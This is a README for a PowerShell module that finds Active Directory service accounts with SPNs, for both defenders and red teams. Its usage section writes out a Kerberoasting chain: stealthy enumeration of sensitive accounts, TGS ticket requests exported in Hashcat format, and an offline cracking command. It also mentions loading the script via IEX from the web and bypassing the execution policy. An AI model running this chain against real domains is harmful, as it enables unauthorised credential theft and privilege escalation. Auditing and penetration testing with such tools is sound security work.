# RiskySPNs
RiskySPNs is a collection of PowerShell scripts focused on detecting and abusing accounts associated with SPNs (Service Principal Name). This module can assist blue teams to identify potentially risky SPNs as well as red teams to escalate privileges by leveraging Kerberos and Active Directory.

For detailed information: http://www.cyberark.com/blog/service-accounts-weakest-link-chain/ 

## Usage
### Install the module
```powershell
Import-Module .\RiskySPNs.psm1
```
**Or just load the script (you can also `IEX` from web)**
```powershell
. .\Find-PotentiallyCrackableAccounts.ps1
```
Make sure `Set-ExecutionPolicy` is `Unrestricted` or `Bypass`
### Get information about a function (very detailed :))
```powershell
Get-Help Get-TGSCipher -Full
```
All fucntions also have `-Verbose` mode

### Search vulnerable SPNs
**Find vulnerable accounts**
```powershell
Find-PotentiallyCrackableAccounts
```
Sensitive + RC4 = $$$

**Generate full deatiled report about vulnerable accounts (CISO <3)**
```powershell
Export-PotentiallyCrackableAccounts
```
### Get tickets
**Request Kerberos TGS for SPN**
```powershell
Get-TGSCipher -SPN "MSSQLSvc/prodDB.company.com:1433"
```

**Or**
```powershell
Find-PotentiallyCrackableAccounts -Stealth -GetSPNs | Get-TGSCipher
```
### The fun stuff :)

```powershell
Find-PotentiallyCrackableAccounts -Sensitive -Stealth -GetSPNs | Get-TGSCipher -Format "Hashcat" | Out-File crack.txt
oclHashcat64.exe -m 13100 crack.txt -a 3
```



